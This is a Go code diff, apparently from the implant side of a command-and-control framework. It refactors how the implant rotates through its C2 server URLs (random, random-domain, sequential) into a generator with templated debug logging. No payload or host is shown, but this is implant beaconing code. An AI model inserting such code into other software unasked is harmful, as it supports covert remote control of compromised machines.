@@ -19,24 +19,26 @@ package transports
 */
 
 import (
+	// {{if .Config.Debug}}
+	"log"
+	// {{end}}
+
 	insecureRand "math/rand"
 	"net/url"
 	"strconv"
 	"time"
 )
 
-var (
-	ccServers = []string{
-		// {{range $index, $value := .Config.C2}}
-		"{{$value}}", // {{$index}}
-		// {{end}}
-	}
+const (
+	StrategyRandom       = "r"
+	StrategyRandomDomain = "rd"
+	StrategySequential   = "s"
+)
 
+var (
 	maxErrors         = GetMaxConnectionErrors()
 	reconnectInterval = time.Duration(0)
 	pollTimeout       = time.Duration(0)
-
-	ccCounter = new(int)
 
 	activeC2         string
 	activeConnection *Connection
@@ -61,28 +63,59 @@ func GetActiveConnection() *Connection {
 	return activeConnection
 }
 
-func nextCCServer() *url.URL {
-	var next string
-	switch "{{.Config.ConnectionStrategy}}" {
-	case "r": // Random
-		next = ccServers[insecureRand.Intn(len(ccServers))]
-	case "rd": // Random Domain
-		next = randomCCDomain(ccServers[*ccCounter%len(ccServers)])
-	case "s": // Sequential
-		next = ccServers[*ccCounter%len(ccServers)]
-	default:
-		next = ccServers[*ccCounter%len(ccServers)]
-	}
-	*ccCounter++
-	uri, err := url.Parse(next)
-	if err != nil {
-		return nextCCServer()
-	}
-	return uri
+// C2Generator - Creates a stream of C2 URLs based on a connection strategy
+func C2Generator(c2Servers []string, abort <-chan struct{}) <-chan *url.URL {
+	// {{if .Config.Debug}}
+	log.Printf("Starting c2 url generator ({{.Config.ConnectionStrategy}}) ...")
+	// {{end}}
+	generator := make(chan *url.URL)
+	go func() {
+		defer close(generator)
+		c2Counter := 0
+		for {
+			var next string
+			switch "{{.Config.ConnectionStrategy}}" {
+			case StrategyRandom: // Random
+				next = c2Servers[insecureRand.Intn(len(c2Servers))]
+			case StrategyRandomDomain: // Random Domain
+				// Select the next sequential C2 then use it's protocol to make a random
+				// selection from all C2s that share it's protocol.
+				next = c2Servers[insecureRand.Intn(len(c2Servers))]
+				next = randomCCDomain(c2Servers, next)
+			case StrategySequential: // Sequential
+				next = c2Servers[c2Counter%len(c2Servers)]
+			default:
+				next = c2Servers[c2Counter%len(c2Servers)]
+			}
+			c2Counter++
+			uri, err := url.Parse(next)
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("Failed to parse C2 url (%s): %s", next, err)
+				// {{end}}
+				continue
+			}
+
+			// {{if .Config.Debug}}
+			log.Printf("Yield c2 uri = '%s'", uri)
+			// {{end}}
+
+			// Generate next C2 URL or abort
+			select {
+			case generator <- uri:
+			case <-abort:
+				return
+			}
+		}
+	}()
+	// {{if .Config.Debug}}
+	log.Printf("Return generator: %#v", generator)
+	// {{end}}
+	return generator
 }
 
 // randomCCDomain - Random selection within a protocol
-func randomCCDomain(next string) string {
+func randomCCDomain(ccServers []string, next string) string {
 	uri, err := url.Parse(next)
 	if err != nil {
 		return next
